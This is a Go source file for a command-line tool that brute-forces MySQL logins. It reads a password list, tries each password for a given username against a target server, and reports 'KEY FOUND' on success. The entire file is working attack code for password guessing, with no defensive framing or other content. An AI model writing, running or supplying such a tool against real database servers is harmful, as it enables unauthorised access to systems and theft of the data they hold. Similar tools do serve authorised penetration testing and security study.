package main

import (
	"database/sql"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	_ "github.com/go-sql-driver/mysql"
)

func main() {
	// Command-line flags
	username := flag.String("l", "", "Username for MySQL")
	passwordListFile := flag.String("P", "", "File containing list of passwords")
	target := flag.String("mysl", "", "Target MySQL IP address (format: <ip>:<port>)")
	flag.Parse()

	// Validate flags
	if *username == "" || *passwordListFile == "" || *target == "" {
		fmt.Println("Usage: brute.go -l <username> -P <password_list> -mysl <target_ip>")
		os.Exit(1)
	}

	// Read the password list file
	passwords, err := readPasswordList(*passwordListFile)
	if err != nil {
		log.Fatalf("Error reading password list: %v\n", err)
	}

	// Attempt to brute force the MySQL login
	for _, password := range passwords {
		fmt.Printf("Trying password: %s\n", password)
		if tryLogin(*username, password, *target) {
			fmt.Printf("KEY FOUND: %s\n", password)
			return
		}
	}

	// If we reach here, no valid password was found
	fmt.Println("KEY NOT FOUND")
}

// readPasswordList reads the password list from a file
func readPasswordList(filename string) ([]string, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	passwords := strings.Split(string(data), "\n")
	return passwords, nil
}

// tryLogin attempts to log in to the MySQL server with the provided username and password
func tryLogin(username, password, target string) bool {
	// Build the connection string
	dsn := fmt.Sprintf("%s:%s@tcp(%s)/", username, password, target)

	// Try to open a connection to MySQL
	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return false
	}
	defer db.Close()

	// Try a simple query to test login
	err = db.Ping()
	if err == nil {
		return true
	}
	return false
}
